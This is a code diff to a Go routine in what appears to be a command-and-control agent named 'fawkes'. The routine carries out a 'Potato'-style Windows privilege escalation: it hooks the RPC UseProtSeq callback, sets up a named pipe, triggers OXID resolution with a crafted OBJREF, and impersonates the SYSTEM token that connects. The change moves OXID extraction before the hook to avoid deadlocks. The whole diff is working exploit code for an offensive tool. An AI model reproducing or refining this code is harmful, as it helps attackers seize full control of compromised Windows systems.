@@ -219,7 +219,19 @@ func getSystemViaPotato(oldIdentity string) structs.CommandResult {
 	origFunc := *(*uintptr)(unsafe.Pointer(useProtSeqSlot))
 	potatoGlobal.origFuncPtr = origFunc
 
-	// Phase 3: Create named pipe server
+	// Phase 3: Extract our process's OXID BEFORE installing the hook.
+	// CreateObjrefMoniker triggers OXID registration which may call UseProtSeq.
+	// We must do this with the original (unhooked) dispatch to avoid deadlocks.
+	oxid, oid, ipid, oxidErr := extractProcessOXID()
+	if oxidErr != nil {
+		return structs.CommandResult{
+			Output:    fmt.Sprintf("Failed to extract process OXID: %v", oxidErr),
+			Status:    "error",
+			Completed: true,
+		}
+	}
+
+	// Phase 4: Create named pipe server
 	pipeName := fmt.Sprintf(`\\.\pipe\fawkes_%d\pipe\epmapper`, time.Now().UnixNano()%100000)
 	potatoGlobal.pipeName = pipeName
 	potatoGlobal.tokenCaptured = false
@@ -277,7 +289,7 @@ func getSystemViaPotato(oldIdentity string) structs.CommandResult {
 	overlapped.HEvent = event
 	procConnectNamedPipe.Call(hPipe, uintptr(unsafe.Pointer(&overlapped)))
 
-	// Phase 4: Hook UseProtSeq to return our pipe binding
+	// Phase 5: Hook UseProtSeq to return our pipe binding
 	// Extract pipe path component for the DUALSTRINGARRAY
 	// The DUALSTRINGARRAY string binding needs just the pipe path without \\.\pipe\ prefix
 	pipeShortName := strings.TrimPrefix(pipeName, `\\.\pipe\`)
@@ -304,10 +316,10 @@ func getSystemViaPotato(oldIdentity string) structs.CommandResult {
 		windows.VirtualProtect(useProtSeqSlot, unsafe.Sizeof(uintptr(0)), oldProtect, &oldProtect)
 	}()
 
-	// Phase 5: Trigger OXID resolution via crafted OBJREF
-	triggerErr := triggerOXIDResolution()
+	// Phase 6: Trigger OXID resolution via crafted OBJREF
+	triggerErr := triggerOXIDResolution(oxid, oid, ipid)
 
-	// Phase 6: Wait for pipe connection (SYSTEM connecting)
+	// Phase 7: Wait for pipe connection (SYSTEM connecting)
 	waitResult, _ := windows.WaitForSingleObject(event, 10000) // 10s timeout
 	if waitResult != windows.WAIT_OBJECT_0 {
 		errMsg := fmt.Sprintf("RPCSS did not connect to pipe within timeout.\nPipe: %s", pipeName)
@@ -321,7 +333,7 @@ func getSystemViaPotato(oldIdentity string) structs.CommandResult {
 		}
 	}
 
-	// Phase 7: Impersonate the SYSTEM token
+	// Phase 8: Impersonate the SYSTEM token
 	ret, _, impErr := procImpersonateNamedPipeClient.Call(hPipe)
 	if ret == 0 {
 		procDisconnectNamedPipe.Call(hPipe)
@@ -630,17 +642,11 @@ func comRelease(punk uintptr) {
 	syscall.SyscallN(releaseFunc, punk)
 }
 
-// triggerOXIDResolution extracts the process's own OXID, constructs a crafted
-// OBJREF with TCP bindings, and calls CoUnmarshalInterface to trigger OXID
+// triggerOXIDResolution constructs a crafted OBJREF with TCP bindings using
+// the process's own OXID, and calls CoUnmarshalInterface to trigger OXID
 // resolution through the hooked UseProtSeq callback.
-func triggerOXIDResolution() error {
-	// Step 1: Get our own OXID, OID, IPID via CreateObjrefMoniker
-	oxid, oid, ipid, err := extractProcessOXID()
-	if err != nil {
-		return fmt.Errorf("extract OXID: %w", err)
-	}
-
-	// Step 2: Build crafted OBJREF with our OXID but TCP bindings to 127.0.0.1
+func triggerOXIDResolution(oxid [8]byte, oid [8]byte, ipid [16]byte) error {
+	// Build crafted OBJREF with our OXID but TCP bindings to 127.0.0.1
 	objref := buildCraftedOBJREF(oxid, oid, ipid)
 
 	// Step 3: Create IStream wrapping our OBJREF
